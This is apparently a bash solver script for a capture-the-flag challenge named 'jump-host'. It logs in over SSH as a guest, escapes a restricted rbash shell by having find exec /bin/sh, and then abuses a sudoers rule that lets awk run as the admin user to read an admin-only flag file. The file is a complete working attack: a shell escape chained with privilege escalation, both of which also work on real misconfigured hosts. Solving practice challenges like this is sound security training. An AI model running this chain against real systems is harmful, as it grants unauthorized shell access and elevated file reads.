#!/usr/bin/env bash
# Solver for jump-host.
#
# Stage 1: the guest login shell is rbash with PATH=/home/guest/bin
#          (ls, less, find only). rbash restricts the *shell*, not programs it
#          starts, so find can exec an absolute /bin/sh for us.
# Stage 2: the sudoers rule lets guest run /usr/bin/awk as the admin user,
#          and awk can read the admin-only flag.
#
# Usage: solve.sh [host] [port]      (password: guest)
# Non-interactive: sshpass -p guest ./solve.sh [host] [port]
# Local container (plain SSH): PLAIN=1 sshpass -p guest ./solve.sh 127.0.0.1 13371
set -euo pipefail

HOST="${1:-jump-host.challs.ingeniums.club}"
PORT="${2:-9450}"

if [[ "${PLAIN:-0}" == "1" ]]; then
    SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR)
else
    SSH_OPTS=(-o ProxyCommand='openssl s_client -quiet -servername %h -connect %h:%p')
fi

ssh "${SSH_OPTS[@]}" -p "$PORT" guest@"$HOST" \
    'find . -maxdepth 0 -exec /bin/sh \;' <<'REMOTE'
/usr/bin/id
/usr/bin/sudo -l
/usr/bin/sudo -u admin /usr/bin/awk '{print}' /home/admin/flag.txt
REMOTE
